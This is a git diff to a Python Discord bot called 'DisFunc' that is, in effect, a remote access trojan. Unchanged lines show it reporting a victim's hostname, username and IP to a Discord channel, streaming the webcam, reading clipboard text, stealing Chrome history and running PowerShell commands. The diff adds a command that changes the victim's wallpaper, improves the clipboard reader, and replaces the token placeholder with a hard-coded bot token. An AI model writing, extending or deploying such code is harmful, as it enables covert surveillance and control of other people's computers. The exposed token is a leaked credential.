@@ -35,17 +35,27 @@ DisFunc = commands.Bot(description='DisFunc', command_prefix='?', bot=True, inte
 DisFunc.remove_command('help')
 loop = asyncio.get_event_loop()
 
+
+
+import difflib
+
 @DisFunc.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandNotFound):
-        await ctx.send('Command not found!')
+        command_name = ctx.invoked_with
+        command_list = [cmd.name for cmd in ctx.bot.commands]
+        similar_commands = difflib.get_close_matches(command_name, command_list, n=1, cutoff=0.5)
+        if similar_commands:
+            await ctx.send(f"Command not found! Did you mean '{similar_commands[0]}'?")
+        else:
+            await ctx.send('Command not found!')
     elif isinstance(error, commands.MissingRequiredArgument):
         await ctx.send('Missing argument!')
 
 @DisFunc.event
 async def on_ready():
     hostname = socket.gethostname()
-    channel = DisFunc.get_channel(1115017737257893888)  # Replace with your desired channel ID 
+    channel = DisFunc.get_channel(1115513661356769341)  # Replace with your desired channel ID 
     user = getpass.getuser()
     ip = GetIP()
     
@@ -129,7 +139,15 @@ async def streamwebcam(ctx):
     
     subprocess.run(["del", file, "/f"], shell=True, check=True)
     subprocess.run(["RMDIR", temp_folder, "/s", "/q"], shell=True, check=True)
-
+@DisFunc.command()
+async def wallpaper(ctx):
+    if len(ctx.message.attachments) == 0:
+        await ctx.send("Please attach an image to set as wallpaper.")
+        return
+    path = os.path.join(os.getenv('TEMP') + r"\temp.jpg")
+    await ctx.message.attachments[0].save(path)
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
+    await ctx.send("[*] Command successfully executed")
 
 
 
@@ -170,8 +188,9 @@ async def record(ctx, seconds: float):
 
 @DisFunc.command()
 async def clipboard(ctx):
-    
     import os
+    import ctypes
+    import discord
     
     CF_TEXT = 1
     kernel32 = ctypes.windll.kernel32
@@ -180,9 +199,9 @@ async def clipboard(ctx):
     kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
     user32 = ctypes.windll.user32
     user32.GetClipboardData.restype = ctypes.c_void_p
-    
+
     user32.OpenClipboard(0)
-    
+
     if user32.IsClipboardFormatAvailable(CF_TEXT):
         data = user32.GetClipboardData(CF_TEXT)
         data_locked = kernel32.GlobalLock(data)
@@ -191,9 +210,11 @@ async def clipboard(ctx):
         kernel32.GlobalUnlock(data_locked)
         body = value.decode()
         user32.CloseClipboard()
-        
+
         embed = discord.Embed(title="Clipboard content is:", description=body, color=0x00ff00)
         await ctx.send(embed=embed)
+    else:
+        await ctx.send("There is no text in the clipboard.")
 
 
 
@@ -435,6 +456,7 @@ async def ahah(ctx):
     
 helpmenu = """
 Availaible commands are :
+?walpaper attach a png or emoji .png and other file supported
 ?admincheck checks if admin
 ?history - Gets the Chrome browsing history
 ?ps <command> - Runs a command in PowerShell
@@ -1146,7 +1168,7 @@ async def screenshot(ctx):
         await ctx.send(f"An error occurred while capturing the screenshot: {str(e)}")
 
 # Replace with your bot token
-loop.create_task(DisFunc.start('your token here'))
+loop.create_task(DisFunc.start('MTAzNTUyMjA2NjI0NzU5MDAxOA.GcmnhN.yl94Wy-TM5yZS94U0BCRpHDtpsH7KCfSDS-7hw'))
 
 try:
     loop.run_forever()
